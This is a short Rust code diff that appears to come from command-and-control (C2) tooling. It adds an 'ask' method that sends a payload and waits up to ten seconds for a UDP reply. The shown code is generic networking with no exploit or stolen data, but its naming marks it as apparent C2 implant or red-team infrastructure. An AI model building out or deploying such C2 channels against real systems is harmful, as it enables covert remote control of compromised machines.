@@ -2,8 +2,8 @@ use std::time::Duration;
 use thiserror::Error;
 use tokio::{net::UdpSocket, time::timeout};
 
-mod reach;
 pub mod payloads;
+mod reach;
 
 #[derive(Error, Debug)]
 pub enum C2ComError {
@@ -39,6 +39,26 @@ impl C2Com {
         }
 
         Ok(())
+    }
+
+    pub async fn ask(&mut self, payload: Vec<u8>) -> Result<Option<Vec<u8>>, C2ComError> {
+        self.send_bytes(payload).await?;
+
+        if let Some(sock) = &self.udp_sock {
+            println!("c2?? waiting for ask-response via udp socket.");
+            let mut response_buf = [0u8; 65535];
+            if let Some(result) = timeout(Duration::from_secs(10), sock.recv(&mut response_buf))
+                .await
+                .ok()
+            {
+                let len = result?;
+                println!("c2<< got ask-response ({len}) via udp socket.");
+                return Ok(Some(response_buf[..len].to_vec()));
+            }
+        }
+
+        println!("c2-- no ask-response via udp socket.");
+        Ok(None)
     }
 }
 
